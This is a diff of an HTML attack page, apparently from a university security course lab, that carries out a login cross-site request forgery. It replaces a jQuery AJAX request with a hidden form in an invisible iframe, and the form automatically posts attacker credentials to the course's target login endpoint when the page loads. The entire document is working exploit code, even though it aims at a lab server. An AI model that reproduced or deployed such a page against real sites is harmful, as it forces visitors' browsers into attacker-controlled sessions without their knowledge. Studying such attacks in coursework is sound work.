@@ -1,23 +1,13 @@
 <html>
-    <head>
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-    </head>
     <body>
+        <!-- dummy i frame to prevent the form from redirecting to the ecen webpage -->
+        <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+        <form action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" target="dummyframe" method="POST">
+            <input type="hidden" name="username" value="attacker" />
+            <input type="hidden" name="password" value="l33th4x" />
+        </form>
         <script>
-            $(function() {
-                console.log("sending...");
-                $.ajax({
-                    type : "POST",
-                    url: "https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4", 
-                    data: { username: "attacker", password: "l33th4x" },
-                    success: function (data) {
-                        console.log(data);
-                    }, 
-                    dataType: "xhr",
-                    headers: {
-                        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
-                    }});
-            });
+            document.forms[0].submit();
         </script>
     </body>
 </html>
